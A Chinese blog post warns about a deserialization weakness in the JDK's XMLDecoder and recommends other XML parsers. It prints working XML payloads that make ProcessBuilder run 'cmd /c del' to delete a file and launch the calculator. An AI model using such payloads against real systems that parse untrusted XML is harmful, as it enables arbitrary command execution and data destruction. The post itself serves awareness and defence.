![](http://img.javastack.cn/17-12-20/73076296.jpg)

昨天在公司发现了一个jdk中的XMLDecoder反序列化的漏洞，看起来很危险！下面通过两个示例来看看这个漏洞的危害！

#### 示例1：利用XmlDecoder删除本地文件

首先来看这个xmldecoder.xml文件内容：

```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_151" class="java.beans.XMLDecoder">
	<object class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="4">
			<void index="0">
				<string>cmd</string>
			</void>
			<void index="1">
				<string>/c</string>
			</void>
			<void index="2">
				<string>del</string>
			</void>
			<void index="3">
				<string>e:\1.txt</string>
			</void>			
		</array>
		<void method="start" />
	</object>
</java>
```

再来看利用XMLDecoder解析这个xml文件的示例代码：

```
private static void byXmlFile() {
	File file = new File("E:\\xmldecoder.xml");
	XMLDecoder xd = null;
	try {
		xd = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
	} catch (Exception e) {
		e.printStackTrace();
	}
	Object s2 = xd.readObject();
	xd.close();
}
```

这段代码执行后，直接删除了本地的e:\1.txt文件，相当于在命令行调用了cmd /c del e:\1.txt命令，直接删除了本地文件，相当恐怖！

#### 示例2：利用XmlDecoder调用本地程序

```
private static void byXmlString() {
	String xml = new StringBuilder().append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
			.append("<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\">")
			.append("    <object class=\"java.lang.ProcessBuilder\">")
			.append("        <array class=\"java.lang.String\" length=\"1\">")
			.append("            <void index=\"0\">")
			.append("                <string>calc</string>")
			.append("            </void>")
			.append("        </array>")
			.append("        <void method=\"start\" />")
			.append("    </object>")
			.append("</java>").toString();
	XMLDecoder xd = null;
	try {
		xd = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
	} catch (Exception e) {
		e.printStackTrace();
	}
	Object s2 = xd.readObject();
	xd.close();
}
```

这段代码改成了用String输入源的形式，这不重要，重要的是还是利用了jdk中的XmlDecoder类来解析xml字符串。这段代码执行后，会调用出本地的计算器程序。

![](http://img.javastack.cn/17-12-20/29679880.jpg)

其中ProcessBuilder.start()的方法和Runtime.exec()方法一样，都可以被用来创建一个操作系统进程，可用来控制进程状态并获得相关信息。

ProcessBuilder的构造方法接受一个命令列表。

```
public ProcessBuilder(List<String> command) {
    if (command == null)
        throw new NullPointerException();
    this.command = command;
}
```

#### 总结

Jdk中的XmlDecoder反序列化存在安全漏洞，能调用本地的应用，也能执行系统支持的命令，一旦黑客组织成命令列表攻击系统，后果不堪设想！

我只是用ProcessBuilder类演示了调用系统程序这两种案例，当然还有其他，远不止这一种攻击手段。作者看了下，这个漏洞在jdk8_0_151版本中还存在。

建议不要用JDK中的XmlDeocder类，寻求其它更安全的xml解析工具类。

求转发，紧急扩散，避免更大程度的损失！~
